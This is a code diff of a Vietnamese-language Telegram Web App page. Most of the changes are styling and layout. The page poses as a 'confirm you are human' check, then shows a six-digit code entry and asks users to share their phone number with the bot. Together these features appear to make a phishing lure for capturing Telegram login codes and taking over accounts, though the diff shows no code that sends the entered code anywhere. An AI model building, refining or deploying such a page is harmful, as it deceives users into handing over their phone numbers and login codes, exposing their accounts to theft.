@@ -8,17 +8,17 @@
 <style>
 body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 
-/* nền ảnh */
+/* nền ảnh mới */
 .bg {
   position: fixed;
   width: 100%;
   height: 100%;
-  background: url("https://sf-static.upanhlaylink.com/img/image_20260324de75528845a06e58dc6de699d22000db.jpg") center/cover no-repeat;
+  background: url("https://sf-static.upanhlaylink.com/img/image_20260325f9888f2c477fd4a70251cff8ac50dce8.jpg") center/cover no-repeat;
   filter: blur(4px);
   transform: scale(1.05);
 }
 
-/* overlay đen nhẹ */
+/* overlay */
 .overlay {
   position: fixed;
   width:100%; height:100%;
@@ -35,7 +35,6 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   animation: wave 1.2s infinite;
 }
 
-/* animation vẫy */
 @keyframes wave {
   0% { transform: translate(-50%, -50%) rotate(0deg); }
   15% { transform: translate(-50%, -50%) rotate(14deg); }
@@ -46,10 +45,10 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   100% { transform: translate(-50%, -50%) rotate(0deg); }
 }
 
-/* hộp nội dung */
+/* hộp text */
 .box {
   position:absolute;
-  bottom:100px;
+  bottom:160px;  /* cao hơn chút để tách button */
   left:20px; right:20px;
   background:#fff;
   padding:18px 15px;
@@ -60,10 +59,18 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   color:#111;
 }
 
+/* hộp button */
+.button-box {
+  position:absolute;
+  bottom:80px;   /* cách box text */
+  left:20px; right:20px;
+  text-align:center;
+}
+
 /* nút */
 .btn {
   width: 90%;
-  margin-top:12px;
+  margin-top:0px;
   background:#3b9edb;
   color:#fff;
   padding:14px;
@@ -73,7 +80,7 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   cursor:pointer;
 }
 
-/* mã code */
+/* Step 2 code input */
 .code-box {
   display:flex;
   justify-content:center;
@@ -98,10 +105,14 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 <!-- icon vẫy tay -->
 <div class="icon">👋</div>
 
-<!-- STEP 1 -->
+<!-- STEP 1 text -->
 <div class="box" id="step1">
   Bạn cần xác nhận mình là người thật,<br>
   hãy nhấp vào nút bên dưới để bắt đầu!
+</div>
+
+<!-- STEP 1 button riêng -->
+<div class="button-box" id="step1-btn">
   <button class="btn" onclick="step2()">Xác nhận</button>
 </div>
 
@@ -124,9 +135,10 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-// chuyển từ Step 1 -> Step 2
+// Step 1 -> Step 2
 function step2(){
   document.getElementById("step1").style.display = "none";
+  document.getElementById("step1-btn").style.display = "none";
   document.getElementById("step2").style.display = "block";
 }
 
@@ -136,7 +148,7 @@ function move(el,i){
   if(el.value.length == 1 && i < 5) inputs[i+1].focus();
 }
 
-// gửi yêu cầu share số điện thoại về bot
+// gửi yêu cầu share số điện thoại
 function requestPhone(){
     tg.sendData("request_phone");
     tg.showAlert("Nhấn nút chia sẻ số điện thoại trong Telegram để tiếp tục!");
